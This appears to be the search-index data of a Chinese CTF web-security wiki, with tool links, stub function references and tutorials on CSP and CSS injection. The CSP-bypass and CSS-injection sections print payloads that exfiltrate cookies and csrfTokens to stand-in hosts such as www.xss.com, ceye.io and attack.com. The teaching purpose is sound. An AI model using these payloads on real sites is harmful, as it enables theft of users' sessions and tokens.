<p>\u7136\u540e\u662f\u672c\u603b\u7ed3\u662f\u4e00\u4e2a\u6846\u67b6\u6027\u8d28\u7684\u4e1c\u897f\uff0c\u4e0d\u53ef\u80fd\u4f5c\u4e3a\u767e\u79d1\u4e00\u6837\u9762\u9762\u4ff1\u5230\uff0c\u4f46\u80fd\u591f\u65b9\u4fbf\u5927\u5bb6\u5bf9\u77e5\u8bc6\u505a\u597d\u7ba1\u7406\u3002\uff08\u5982\u679c\u6709\u65f6\u95f4\u7684\u8bdd\uff0c\u6211\u4e5f\u4f1a\u5199\u4e00\u70b9\u597d\u73a9\u7684\u4e1c\u897f\uff09</p> <p>\u518d\u6709\u5c31\u662f\u4e00\u4e9b\u5de5\u5177\u6027\u7684\u4e1c\u897f\u6211\u4f1a\u9009\u62e9\u6027\u7684\u4ecb\u7ecd\uff0c\u4f46\u662f\u6700\u57fa\u7840\u7684burpsuite\uff0cSwitchyOmega\u7b49\u8fd9\u4e9b\u4e1c\u897f\u8fd8\u662f\u9ed8\u8ba4\u8981\u4f1a\u7684\u3002\uff08\u4e0d\u4f1a\u7684\u81ea\u5df1\u5199\u70b9\u603b\u7ed3\u653e\u4e0a\u6765\uff09</p> <p>\u6700\u540e\u66f4\u4e3a\u8d34\u5fc3\u7684\u662f\uff0c\u5927\u90e8\u5206\u90fd\u9644\u8d60\u4f8b\u9898</p> <p></p> <p>\uff08\u4ee5\u4e0b\u6765\u81ea\u7f51\u56fe</p> <p>\u53e6\u5916\u4e00\u5f20\u592a\u5927\u4e86\uff0c\u4e0a\u4f20\u4e0d\u4e0a\u6765</p> <p></p>"},{"location":"web/website/","title":"\u5de5\u5177\u7f51\u7ad9","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5982\u679c\u6709\u77e5\u9053\u7684\u66f4\u591a\u7684\u8bdd\uff0c\u76f4\u63a5\u5f80\u4e0a\u642c\u8fd0\u5c31OK\u4e86\uff0c\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca\u3002</p> <p>http://ctf.ssleye.com/\u91cc\u9762\u7528\u7684\u591a\u4e00\u70b9\u7684\u662f\u4e0e\u7f16\u7801\u76f8\u5173\uff0c\u5176\u4ed6\u5bc6\u7801\u5b66\uff0cmisc\u7b80\u5355\u4e00\u70b9\u7684\u4e5f\u4f1a\u7528\u5230\u3002</p> <ul> <li> <p>https://tool.bugku.com/\u57fa\u672c\u540c\u4e0a</p> </li> <li> <p>https://www.bejson.com/json\u683c\u5f0f\u5316\u6821\u9a8c</p> </li> <li> <p>https://tool.lu/coderunner/\u4ee3\u7801\u5728\u7ebf\u8fd0\u884c\uff08php\u7531\u4e8e\u7248\u672c\u592a\u591a\u7684\u95ee\u9898\u5efa\u8bae\u81ea\u5df1\u642d\uff09</p> </li> <li> <p>https://www.compart.com/en/unicode/search?q=thousand#characters\u5b57\u7b26\u8f6c\u7801\u7684\u7f51\u7ad9\uff0c\u7ecf\u5e38\u4f1a\u7528\u6765\u505a\u5b57\u7b26\u7ed5\u8fc7\uff0c\u6bd4\u5982\u8bf4\u1d00\u7b49\u7b49</p> </li> <li> <p>https://jwt.io/JWT\u52a0\u89e3\u5bc6\u7684\u7f51\u7ad9\uff0c\u5982\u679c\u770b\u5230session\u4e3a\u4e09\u6bb5\u5f0f\uff0c\u4e0d\u59a8\u653e\u8fdb\u53bb\u770b\u770b\u3002\u4f1a\u7528\u5728session\u4f2a\u9020\u4e2d\u3002\uff08Json web token\uff09</p> </li> <li> <p>https://github.com/bowu678/php_bugs\u4e00\u4e2a\u9879\u76ee\uff0c\u5173\u4e8ephp\u7684\u4ee3\u7801\u5ba1\u8ba1\u7684\u9879\u76ee\uff0c\u521d\u5b66\u7684\u8bdd\u53ef\u4ee5\u5b66\u5230\u86ee\u591a\u3002</p> </li> <li> <p>https://www.yuque.com/jxswcy/ctfnotebook\u535a\u5ba2\uff0c\u5efa\u8bae\u4e0d\u60f3\u505a\u9898\u7684\u65f6\u5019\u98df\u7528\u3002</p> </li> <li> <p>https://docs.python-requests.org/zh_CN/latest/user/quickstart.html#post-multipart-encoded\u8fd9\u4e2a\u662frequests\u5e93\u7684\u5b98\u65b9\u4e2d\u6587\u6587\u6863\uff0c\u7531\u4e8e\u5199\u811a\u672c\u80af\u5b9a\u662f\u4f1a\u7528\u5230\u7684\uff0c\u5efa\u8bae\u770b\u770b</p> </li> <li></li> </ul>"},{"location":"web/Function_library/Go/","title":"Go","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/Function_library/JavaScript/","title":"JavaScript","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/Function_library/PHP/","title":"abcd","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/Function_library/PHP/#efgh","title":"efgh","text":""},{"location":"web/Function_library/PHP/#f","title":"F","text":"<pre><code>file_put_contents\nfile_put_contents \u2014 \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6\n file_put_contents ( string $filename , mixed $data , int $flags = 0 , resource $context = ? ) : int\n data :\n\n\u8981\u5199\u5165\u7684\u6570\u636e\u3002\u7c7b\u578b\u53ef\u4ee5\u662f string\uff0carray \u6216\u8005\u662f stream \u8d44\u6e90\uff08\u5982\u4e0a\u9762\u6240\u8bf4\u7684\u90a3\u6837\uff09\u3002 \n\n flags: \n\nflags \u7684\u503c\u53ef\u4ee5\u662f \u4ee5\u4e0b flag \u4f7f\u7528 OR (|) \u8fd0\u7b97\u7b26\u8fdb\u884c\u7684\u7ec4\u5408\u3002 \n\n context\n\n\u4e00\u4e2a context \u8d44\u6e90\u3002\u00a0\n</code></pre>"},{"location":"web/Function_library/PHP/#_1","title":"abcd","text":""},{"location":"web/Function_library/PHP/#ijkl","title":"ijkl","text":""},{"location":"web/Function_library/PHP/#mnop","title":"mnop","text":""},{"location":"web/Function_library/PHP/#m","title":"m","text":"<p>'</p>"},{"location":"web/Function_library/PHP/#n","title":"n","text":""},{"location":"web/Function_library/PHP/#o","title":"o","text":""},{"location":"web/Function_library/PHP/#p","title":"p","text":""},{"location":"web/Function_library/PHP/#qrst","title":"qrst","text":""},{"location":"web/Function_library/PHP/#q","title":"Q","text":""},{"location":"web/Function_library/PHP/#r","title":"R","text":""},{"location":"web/Function_library/PHP/#s","title":"S","text":""},{"location":"web/Function_library/PHP/#scandir","title":"scandir","text":"<p>scandir() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6570\u7ec4\u3002</p>"},{"location":"web/Function_library/PHP/#stristr","title":"stristr()","text":"<p>\u51fd\u6570\u641c\u7d22\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u3002</p> <p>\u6ce8\u91ca\uff1a\u8be5\u51fd\u6570\u662f\u4e8c\u8fdb\u5236\u5b89\u5168\u7684\u3002</p> <p>\u6ce8\u91ca\uff1a\u8be5\u51fd\u6570\u662f\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u3002\u5982\u9700\u8fdb\u884c\u533a\u5206\u5927\u5c0f\u5199\u7684\u641c\u7d22\uff0c\u8bf7\u4f7f\u7528 strstr() \u51fd\u6570\u3002</p>"},{"location":"web/Function_library/PHP/#t","title":"T","text":""},{"location":"web/Function_library/PHP/#uvwxyz","title":"uvwxyz","text":""},{"location":"web/Function_library/PHP/#u","title":"U","text":""},{"location":"web/Function_library/PHP/#unlink","title":"unlink","text":"<p>unlink() \u51fd\u6570\u5220\u9664\u6587\u4ef6\u3002</p> <p>\u82e5\u6210\u529f\uff0c\u5219\u8fd4\u56de true\uff0c\u5931\u8d25\u5219\u8fd4\u56de false\u3002</p> <p>unlink(filename,context)</p>"},{"location":"web/Function_library/python/","title":"abcd","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/Function_library/python/#efgh","title":"efgh","text":""},{"location":"web/Function_library/python/#ijkl","title":"ijkl","text":""},{"location":"web/Function_library/python/#mnop","title":"mnop","text":""},{"location":"web/Function_library/python/#qrst","title":"qrst","text":""},{"location":"web/Function_library/python/#uvwxyz","title":"uvwxyz","text":""},{"location":"web/XSS_CSS_CSP/csp/CSP/","title":"CSP","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u6216CSP\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d4f\u89c8\u5668\u5b89\u5168\u63aa\u65bd\uff0c\u7528\u4e8e\u9632\u5fa1\u8de8\u7ad9\u70b9\u811a\u672c\uff08XSS\uff09\u7b49Web\u653b\u51fb\u3002\u8be5\u7b56\u7565\u7684\u89c4\u5219\u7528\u4e8e\u5b9a\u4e49\u4e00\u7ec4\u6d4f\u89c8\u5668\u53ef\u4ee5\u5b89\u5168\u5730\u4ece\u4e2d\u52a0\u8f7d\u5185\u5bb9\u7684\u8def\u5f84\u548c\u6e90\uff0c\u5e76\u7ed9\u51fa\u76f8\u5e94\u7684\u63cf\u8ff0\u3002\u5176\u4e2d\uff0c\u8fd9\u4e9b\u8d44\u6e90\u5305\u62ec\u56fe\u50cf\u3001frame\u3001javascripts\u7b49\u3002</p> <p>\u4e00\u4e2aCSP\u5934\u7531\u591a\u7ec4CSP\u7b56\u7565\u7ec4\u6210\uff0c\u4e2d\u95f4\u7531\u5206\u53f7\u5206\u9694\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a</p> <pre><code>Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'\nPlain Text\n</code></pre> <p>\u5176\u4e2d\u6bcf\u4e00\u7ec4\u7b56\u7565\u5305\u542b\u4e00\u4e2a\u7b56\u7565\u6307\u4ee4\u548c\u4e00\u4e2a\u5185\u5bb9\u6e90\u5217\u8868</p> <p>\u4e00\u3001\u5e38\u7528\u7684\u7b56\u7565\u6307\u4ee4\uff1a</p>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#default-src","title":"default-src","text":"<p>default-src \u6307\u4ee4\u5b9a\u4e49\u4e86\u90a3\u4e9b\u6ca1\u6709\u88ab\u66f4\u7cbe\u786e\u6307\u4ee4\u6307\u5b9a\u7684\u5b89\u5168\u7b56\u7565\u3002\u8fd9\u4e9b\u6307\u4ee4\u5305\u62ec\uff1a</p> <p>child-srcchild-src \u6307\u5b9a\u5b9a\u4e49\u4e86 web workers \u4ee5\u53ca\u5d4c\u5957\u7684\u6d4f\u89c8\u4e0a\u4e0b\u6587\uff08\u5982<code>&lt;frame&gt;</code>\u548c<code>&lt;iframe&gt;</code>\uff09\u7684\u6e90\u3002</p> <ul> <li> <p>connect-srcconnect-src\u5b9a\u4e49\u4e86\u8bf7\u6c42\u3001XMLHttpRequest\u3001WebSocket \u548c EventSource \u7684\u8fde\u63a5\u6765\u6e90\u3002</p> </li> <li> <p>font-srcfont-src\u5b9a\u4e49\u4e86\u5b57\u4f53\u52a0\u8f7d\u7684\u6709\u6548\u6765\u6e90</p> </li> <li> <p>img-srcimg-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2d\u56fe\u7247\u548c\u56fe\u6807\u7684\u6709\u6548\u6765\u6e90</p> </li> <li></li> <li>media-src</li> <li>object-src</li> </ul> <p>script-srcscript-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2dJavascript\u7684\u6709\u6548\u6765\u6e90</p> <ul> <li> <p>style-srcstyle-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2dCSS\u6837\u5f0f\u7684\u6709\u6548\u6765\u6e90</p> </li> <li></li> </ul>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#_1","title":"\u4e8c\u3001\u5185\u5bb9\u6e90\uff1a","text":"<p>\u5185\u5bb9\u6e90\u6709\u4e09\u79cd\uff1a\u6e90\u5217\u8868\u3001\u5173\u952e\u5b57\u548c\u6570\u636e</p> <p>1\u3001\u6e90\u5217\u8868</p> <pre><code>\u6e90\u5217\u8868\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u4e86\u4e00\u4e2a\u6216\u591a\u4e2a\u4e92\u8054\u7f51\u4e3b\u673a\uff08\u901a\u8fc7\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\uff09\uff0c\u548c\u53ef\u9009\u7684\u6216\u7aef\u53e3\u53f7\u3002\u7ad9\u70b9\u5730\u5740\u53ef\u4ee5\u5305\u542b\u53ef\u9009\u7684\u901a\u914d\u7b26\u524d\u7f00 (\u661f\u53f7, '*')\uff0c\u7aef\u53e3\u53f7\u4e5f\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 (\u540c\u6837\u662f '*') \u6765\u8868\u660e\u6240\u6709\u5408\u6cd5\u7aef\u53e3\u90fd\u662f\u6709\u6548\u6765\u6e90\u3002\u4e3b\u673a\u901a\u8fc7\u7a7a\u683c\u5206\u9694\u3002\u6709\u6548\u7684\u4e3b\u673a\u8868\u8fbe\u5f0f\u5305\u62ec\uff1a    http://*.foo.com \uff08\u5339\u914d\u6240\u6709\u4f7f\u7528 http\u534f\u8bae\u52a0\u8f7d foo.com \u4efb\u4f55\u5b50\u57df\u540d\u7684\u5c1d\u8bd5\u3002\uff09    mail.foo.com:443 \uff08\u5339\u914d\u6240\u6709\u8bbf\u95ee mail.foo.com \u7684 443 \u7aef\u53e3 \u7684\u5c1d\u8bd5\u3002\uff09    https://store.foo.com  \uff08\u5339\u914d\u6240\u6709\u4f7f\u7528 https\u534f\u8bae\u8bbf\u95ee store.foo.com \u7684\u5c1d\u8bd5\u3002\uff09\u5982\u679c\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u6307\u5b9a\uff0c\u6d4f\u89c8\u5668\u4f1a\u4f7f\u7528\u6307\u5b9a\u534f\u8bae\u7684\u9ed8\u8ba4\u7aef\u53e3\u53f7\u3002\u5982\u679c\u534f\u8bae\u6ca1\u6709\u88ab\u6307\u5b9a\uff0c\u6d4f\u89c8\u5668\u4f1a\u4f7f\u7528\u8bbf\u95ee\u8be5\u6587\u6863\u65f6\u7684\u534f\u8bae\u3002\nPlain Text\n</code></pre> <p>2\u3001\u5173\u952e\u5b57</p> <p>\u2018none\u2019  \u4ee3\u8868\u7a7a\u96c6\uff1b\u5373\u4e0d\u5339\u914d\u4efb\u4f55 URL\u3002\u4e24\u4fa7\u5355\u5f15\u53f7\u662f\u5fc5\u987b\u7684\u3002</p> <ul> <li> <p>\u2018self\u2019  \u4ee3\u8868\u548c\u6587\u6863\u540c\u6e90\uff0c\u5305\u62ec\u76f8\u540c\u7684 URL \u534f\u8bae\u548c\u7aef\u53e3\u53f7\u3002\u4e24\u4fa7\u5355\u5f15\u53f7\u662f\u5fc5\u987b\u7684\u3002</p> </li> <li> <p>\u2018unsafe-inline\u2019  \u5141\u8bb8\u4f7f\u7528\u5185\u8054\u8d44\u6e90\uff0c\u5982\u5185\u8054\u7684</p> </li> <li></li> </ul>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#3","title":"3\u3001\u6570\u636e","text":"<p>data:  \u5141\u8bb8data: URI\u4f5c\u4e3a\u5185\u5bb9\u6765\u6e90\u3002</p> <ul> <li>mediastream:  \u5141\u8bb8mediastream: URI\u4f5c\u4e3a\u5185\u5bb9\u6765\u6e90\u3002 Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:</li> </ul>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#csp_1","title":"CSP\u7ed5\u8fc7","text":"<p>\u548cXSS\u8fd8\u662f\u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u6bd5\u7adf\u9700\u8981\u7ed5\u8fc7\u7684\u5c31\u662fXSS\u561b</p>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#1url","title":"1\u3001url\u8df3\u8f6c","text":"<p>\u5728default-src \u2018none\u2019\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528meta\u6807\u7b7e\u5b9e\u73b0\u8df3\u8f6c</p> <pre><code>&lt;meta http-equiv=\"refresh\" content=\"1;url=http://www.xss.com/x.php?c=[cookie]\" &gt;\n1\nPlain Text\n</code></pre> <p>\u5728\u5141\u8bb8unsafe-inline\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u7528window.location\uff0c\u6216\u8005window.open\u4e4b\u7c7b\u7684\u65b9\u6cd5\u8fdb\u884c\u8df3\u8f6c\u7ed5\u8fc7\u3002</p> <pre><code>&lt;script&gt;  window.location=\"http://www.xss.com/x.php?c=[cookie]\";&lt;/script&gt;\n123\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#2link-csplink","title":"2\u3001<code>&lt;link&gt;</code>\u6807\u7b7e\u9884\u52a0\u8f7d CSP\u5bf9link\u6807\u7b7e\u7684\u9884\u52a0\u8f7d\u529f\u80fd\u8003\u8651\u4e0d\u5b8c\u5584\u3002","text":"<p>\u5728Chrome\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u6807\u7b7e\u53d1\u9001cookie</p> <pre><code>&lt;link rel=\"prefetch\" href=\"http://www.xss.com/x.php?c=[cookie]\"&gt;\n1\nPlain Text\n</code></pre> <p>\u5728Firefox\u4e0b\uff0c\u53ef\u4ee5\u5c06cookie\u4f5c\u4e3a\u5b50\u57df\u540d\uff0c\u7528dns\u9884\u89e3\u6790\u7684\u65b9\u5f0f\u628acookie\u5e26\u51fa\u53bb\uff0c\u67e5\u770bdns\u670d\u52a1\u5668\u7684\u65e5\u5fd7\u5c31\u80fd\u5f97\u5230cookie</p> <pre><code>&lt;link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\"&gt;\n1\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#3_1","title":"3\u3001\u5229\u7528\u6d4f\u89c8\u5668\u8865\u5168","text":"<p>\u6709\u4e9b\u7f51\u7ad9\u9650\u5236\u53ea\u6709\u67d0\u4e9b\u811a\u672c\u624d\u80fd\u4f7f\u7528\uff0c\u5f80\u5f80\u4f1a\u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\u7684nonce\u5c5e\u6027\uff0c\u53ea\u6709nonce\u4e00\u81f4\u7684\u811a\u672c\u624d\u751f\u6548\uff0c\u6bd4\u5982CSP\u8bbe\u7f6e\u6210\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>Content-Security-Policy: default-src 'none';script-src 'nonce-abc'\n1\nPlain Text\n</code></pre> <p>\u90a3\u4e48\u5f53\u811a\u672c\u63d2\u5165\u70b9\u4e3a\u5982\u4e0b\u7684\u60c5\u51b5\u65f6</p> <pre><code>&lt;p&gt;\u63d2\u5165\u70b9&lt;/p&gt;    &lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt;\n12\nPlain Text\n</code></pre> <p>\u8fd9\u6837\u4f1a\u62fc\u6210\u4e00\u4e2a\u65b0\u7684script\u6807\u7b7e\uff0c\u5176\u4e2d\u7684src\u53ef\u4ee5\u81ea\u7531\u8bbe\u5b9a</p> <pre><code>&lt;p&gt;&lt;script src=//14.rs a=\"&lt;/p&gt;    &lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt;\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/","title":"CSS\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u5757\u6211\u662f\u4e0d\u592a\u4f1a\u7684\u56e0\u6b64\uff1a\uff08\u6697\u793a\u767d\u5ad6\uff09</p> <p>\u5c42\u53e0\u6837\u5f0f\u8868(\u82f1\u6587\u5168\u79f0\uff1aCascading Style Sheets)\u662f\u4e00\u79cd\u7528\u6765\u8868\u73b0HTML\uff08\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u4e00\u4e2a\u5e94\u7528\uff09\u6216XML\uff08\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u4e00\u4e2a\u5b50\u96c6\uff09\u7b49\u6587\u4ef6\u6837\u5f0f\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002CSS\u4e0d\u4ec5\u53ef\u4ee5\u9759\u6001\u5730\u4fee\u9970\u7f51\u9875\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5404\u79cd\u811a\u672c\u8bed\u8a00\u52a8\u6001\u5730\u5bf9\u7f51\u9875\u5404\u5143\u7d20\u8fdb\u884c\u683c\u5f0f\u5316\u3002</p> <p>CSS \u80fd\u591f\u5bf9\u7f51\u9875\u4e2d\u5143\u7d20\u4f4d\u7f6e\u7684\u6392\u7248\u8fdb\u884c\u50cf\u7d20\u7ea7\u7cbe\u786e\u63a7\u5236\uff0c\u652f\u6301\u51e0\u4e4e\u6240\u6709\u7684\u5b57\u4f53\u5b57\u53f7\u6837\u5f0f\uff0c\u62e5\u6709\u5bf9\u7f51\u9875\u5bf9\u8c61\u548c\u6a21\u578b\u6837\u5f0f\u7f16\u8f91\u7684\u80fd\u529b\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\u5c31\u662f\u7f8e\u5316\u7f51\u7ad9\u7684\u3002</p> <p>\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u5df2\u4e0d\u5141\u8bb8\u5728CSS\u4e2d\u6267\u884cJavaScript\u4e86\uff0c\u4ee5\u524d\u7684CSS\u6ce8\u5165\u53ef\u4ee5\u5229\u7528JavaScript\u534f\u8bae\u5728<code>url()</code>\u3001<code>expression()</code>\u4e2d\u6267\u884cJavascript\u4ee3\u7801\u4ece\u800c\u5b9e\u73b0XSS\u3002\u4f46\u662f\u76ee\u524dCSS\u6ce8\u5165\u5728\u7a83\u53d6\u6570\u636e\u65b9\u9762\u4ecd\u7136\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u4e0b\u9762\u5206\u522b\u6765\u5206\u6790\u4e00\u4e0b\u3002</p>"},{"location":"web/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/#_1","title":"\u7a83\u53d6\u6807\u7b7e\u5c5e\u6027\u6570\u636e","text":"<p>CSS\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5c5e\u6027\u9009\u62e9\u5668\uff0c\u6839\u636e\u4e0d\u540c\u7684\u5c5e\u6027\u9009\u62e9\u6807\u7b7e\u3002\u6bd4\u5982\u4e0b\u9762CSS\u9009\u62e9\u542b\u6709a\u5c5e\u6027\u4e14\u5176\u503c\u4e3aabc\u7684p\u6807\u7b7e\u3002</p> <pre><code>&lt;style&gt;p[a=\"abc\"]{ color: red;}&lt;/style&gt;\n &lt;p a=\"abc\"&gt;hello world&lt;/p&gt;\nPlain Text\n</code></pre> <p>\u5c5e\u6027\u9009\u62e9\u5668\u8fd8\u53ef\u4ee5\u5339\u914d\u503c\u7684\u4e00\u4e9b\u7279\u6027\uff0c\u6bd4\u5982\u4ee5XXX\u5f00\u5934\u3001\u4ee5XXX\u7ed3\u5c3e\u7b49\u3002</p> <p></p> <p>\u5229\u7528\u4e0a\u9762\u7684\u6027\u8d28\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u7a83\u53d6\u9875\u9762\u6807\u7b7e\u5c5e\u6027\u4e2d\u7684\u6570\u636e\u3002\u6bd4\u5982\u4e0b\u9762\u5f53csrfToken\u4ee5\u67d0\u4e2a\u5b57\u6bcd\u5f00\u5934\u65f6\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7url()\u901a\u77e5\u653b\u51fb\u8005\uff0c\u4ece\u800c\u7a83\u53d6csrfToken\u7684\u7b2c\u4e00\u4f4d\u7684\u503c\u3002</p> <pre><code>&lt;style&gt;input[value^=\"0\"] {    background: url(http://attack.com/0);}input[value^=\"1\"] {    background: url(http://attack.com/1);}input[value^=\"2\"] {    background: url(http://attack.com/2);}...input[value^=\"Y\"] {    background: url(http://attack.com/Y);}input[value^=\"Z\"] {    background: url(http://attack.com/Z);}&lt;/style&gt;&lt;input  name=\"csrfToken\" value=\"ZTU1MzE1YjRiZGQMRmNjYwMTAzYjk4YjhjNGI0ZA==\"&gt;\nPlain Text\n</code></pre> <p>\u7b2c\u4e00\u4f4d\u662fZ\uff0c\u63a5\u7740\u7a83\u53d6\u7b2c\u4e8c\u4f4d</p> <pre><code>&lt;style&gt;input[value^=\"Z0\"] {    background: url(http://attack.com/0);}...input[value^=\"ZZ\"] {    background: url(http://attack.com/Z);}&lt;/style&gt;&lt;input  name=\"csrfToken\" value=\"ZTU1MzE1YjRiZGQMRmNjYwMTAzYjk4YjhjNGI0ZA==\"&gt;\nPlain Text\n</code></pre> <p>\u89e3\u51b3hidden</p> <p>\u5f53\u7136\u8fd8\u6709\u4e2a\u95ee\u9898\uff0c \u5f53\u6807\u7b7e<code>type=hidden</code>\u65f6\u6d4f\u89c8\u5668\u662f\u4e0d\u5141\u8bb8\u6211\u4eec\u8bbe\u7f6ebackground\u7684\uff0c\u8fd9\u6837\u5c31\u65e0\u6cd5\u89e6\u53d1<code>url()</code>\u8bf7\u6c42\u670d\u52a1\u5668\u3002\u89e3\u51b3\u65b9\u6cd5\u4e4b\u4e00\u662f\u5229\u7528<code>~</code>CSS\u7684\u5144\u5f1f\u9009\u62e9\u5668\uff0c\u9009\u62e9\u4e3a\u540e\u7eed\u6240\u6709\u5144\u5f1f\u8282\u70b9\u8bbe\u7f6ebackground\u3002</p> <pre><code>input[value^=\"Z\"] ~*{    background: url(http://attack.com/Z);}\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/#_2","title":"\u6279\u91cf\u5b9e\u73b0","text":"<p>\u5f53\u7136\uff0c\u5982\u679c\u4f4d\u6570\u6bd4\u8f83\u77ed\u4e14\u53ef\u80fd\u6027\u6bd4\u8f83\u5c11\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u6240\u6709\u90fd\u5217\u51fa\u6765\uff0c\u4f46\u662f\u901a\u5e38\u90fd\u592a\u591a\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u6280\u5de7\u6279\u91cf\u5f97\u5230\u3002</p> <p>\u5047\u8bbe\u76ee\u6807\u5b58\u5728css\u6ce8\u5165\u7684\u7f51\u7ad9\u4e3a\u5982\u4e0b\uff0c \u76ee\u6807\u662f\u7a83\u53d6input\u6807\u7b7e\u4e2d\u7684csrfToken\u503c\u3002</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CSS injection&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;input type=hidden name=\"csrfToken\" value=&lt;?=md5(date(\"h\"))?&gt;&gt;\n&lt;input type=\"\" name=\"\"&gt;\n&lt;style&gt;&lt;?php echo $_GET['css']?&gt;&lt;/style&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nPlain Text\n</code></pre> <p>\u6709iframe</p> <p>\u5f53\u5b58\u5728CSS\u6ce8\u5165\u7684\u7f51\u7ad9\u54cd\u5e94\u5934\u672a\u88ab<code>X-Frame-Options</code>\u4fdd\u62a4\u65f6\uff0c \u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u9875\u9762\uff0c\u5229\u7528js\u521b\u5efaiframe\u5305\u542b\u8be5\u6f0f\u6d1e\u7f51\u7ad9\uff0c\u5229\u7528css\u6ce8\u5165\u83b7\u5f97\u4e00\u4f4dcsrfToken\u503c\u540e\u901a\u8fc7<code>url()</code>\u63d0\u4ea4\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u6307\u793a\u524d\u7aefjs\u7ee7\u7eed\u521b\u5efaiframe\u7a83\u53d6\u7b2c\u4e8c\u4f4d\u503c\uff0c\u7ee7\u7eed\u4e0a\u9762\u7684\u64cd\u4f5c\uff0c\u76f4\u5230\u5168\u90e8\u8bfb\u53d6\u5b8c\u3002\u5f53\u7136\u8fd9\u8981\u6c42\u6bcf\u6b21\u8bf7\u6c42\u6f0f\u6d1e\u7f51\u7ad9\u5185\u5bb9\u90fd\u4e0d\u4f1a\u53d8\u3002</p> <p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u670d\u52a1\u5668\u5982\u4f55\u6307\u793a\u524d\u7aefjs\u6784\u9020css\uff0c\u5c31\u50cf\u6211\u4eec\u4e0a\u9762\u4e3e\u5f97\u4f8b\u5b50\u7a83\u53d6\u5230\u7b2c\u4e00\u4f4d\u4e3aZ\uff0c \u90a3\u4e48\u7b2c\u4e8c\u4f4d\u7684payload\u5e94\u8be5\u662fZ\u5f00\u5934\u7684\u3002</p> <p>\u4e0b\u9762\u7684payload \u6765\u81ea\u8fd9\u91cchttps://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d</p> 